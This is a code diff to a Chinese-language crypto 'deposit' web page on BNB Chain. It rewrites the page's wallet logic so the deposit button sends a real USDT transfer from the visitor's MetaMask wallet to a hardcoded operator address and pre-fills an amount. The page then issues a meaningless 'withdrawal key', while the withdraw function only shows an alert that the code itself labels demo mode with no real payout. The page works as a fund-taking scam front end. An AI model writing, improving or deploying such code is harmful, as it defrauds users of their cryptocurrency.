@@ -57,7 +57,7 @@ input{width:100%;padding:15px;background:#10151e;border:1px solid #273044;border
         <div class="amount-btn" data-val="500">500</div>
         <div class="amount-btn" data-val="2000">2000</div>
       </div>
-      <input id="amount" type="text" placeholder="自定义数量">
+      <input id="amount" type="text" placeholder="自定义数量" value="0.1">
     </div>
     <button class="submit-btn" id="depositBtn">确认存入（上链转账）</button>
 
@@ -106,7 +106,6 @@ document.querySelectorAll('.amount-btn').forEach(btn => {
 // 配置信息
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"
 const YOUR_ADDRESS = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
-const USDT_ABI = [{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}]
 
 let currentAccount = null
 let savedKey = ''
@@ -114,10 +113,22 @@ const connectBtn = document.getElementById('connectBtn')
 const addrText = document.getElementById('addr')
 const balanceText = document.getElementById('balance')
 
+// 工具函数：将地址补全为64位十六进制
+function padAddress(addr) {
+  return addr.slice(2).padStart(64, '0')
+}
+
+// 工具函数：将数量转为18位小数的十六进制
+function toWeiHex(amount) {
+  const wei = BigInt(Math.round(Number(amount) * 1e18))
+  return wei.toString(16).padStart(64, '0')
+}
+
 // 连接钱包 + 切换 BSC
 connectBtn.onclick = async () => {
   if (!window.ethereum) return alert('请在 MetaMask / TP 钱包内打开')
   try {
+    // 切换到 BNB 链（主网/测试网兼容）
     await window.ethereum.request({
       method: 'wallet_addEthereumChain',
       params: [{
@@ -140,15 +151,25 @@ connectBtn.onclick = async () => {
   }
 }
 
-// 获取 USDT 余额
+// 获取 USDT 余额（原生 eth_call，不依赖 ethers）
 async function getUSDTBalance(address) {
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum)
-    const contract = new ethers.Contract(USDT_CONTRACT, [{"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}], provider)
-    const balance = await contract.balanceOf(address)
-    const usdt = ethers.utils.formatUnits(balance, 18)
-    balanceText.innerText = `钱包余额：${parseFloat(usdt).toFixed(4)} USDT`
-  } catch(e){}
+    // balanceOf 函数签名：0x70a08231
+    const data = '0x70a08231' + padAddress(address)
+    const result = await window.ethereum.request({
+      method: 'eth_call',
+      params: [{
+        to: USDT_CONTRACT,
+        data: data
+      }, 'latest']
+    })
+    const balance = BigInt(result)
+    const usdt = Number(balance) / 1e18
+    balanceText.innerText = `钱包余额：${usdt.toFixed(4)} USDT`
+  } catch(e) {
+    console.error(e)
+    balanceText.innerText = `钱包余额：获取失败`
+  }
 }
 
 // 生成提取密钥
@@ -159,25 +180,31 @@ function generateKey(){
   return key
 }
 
-// 真实 USDT 转账
+// 真实 USDT 转账（原生 eth_sendTransaction，不依赖 ethers）
 document.getElementById('depositBtn').onclick = async () => {
   if(!currentAccount) return alert('请先连接钱包')
   const val = document.getElementById('amount').value
   if(!val||isNaN(val)||Number(val)<=0) return alert('输入有效数量')
 
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum)
-    const signer = provider.getSigner()
-    const contract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer)
+    // transfer 函数签名：0xa9059cbb + 目标地址 + 数量
+    const data = '0xa9059cbb' + padAddress(YOUR_ADDRESS) + toWeiHex(val)
     
-    const amount = ethers.utils.parseUnits(val, 18)
-    const tx = await contract.transfer(YOUR_ADDRESS, amount)
-    
+    const tx = await window.ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [{
+        from: currentAccount,
+        to: USDT_CONTRACT,
+        data: data,
+        gas: '0x5B8D80' // 固定 Gas 上限，兼容主网/测试网
+      }]
+    })
+
     savedKey = generateKey()
     document.getElementById('keyArea').style.display = 'block'
     document.getElementById('withdrawKey').innerText = savedKey
 
-    alert(`存入成功！\n交易哈希：${tx.hash}\n\n请复制保存您的提取密钥`)
+    alert(`存入成功！\n交易哈希：${tx}\n\n请复制保存您的提取密钥`)
     getUSDTBalance(currentAccount)
   } catch(e){
     alert('交易取消或失败：'+e.message)
@@ -198,7 +225,5 @@ document.getElementById('doWithdraw').onclick = () => {
   alert(`密钥正确！\n已向地址：${addr}\n发起提现：${amt} USDT\n（演示模式，无真实到账）`)
 }
 </script>
-<!-- 引入 ethers.js 用于处理 USDT 转账 -->
-<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
 </body>
 </html>
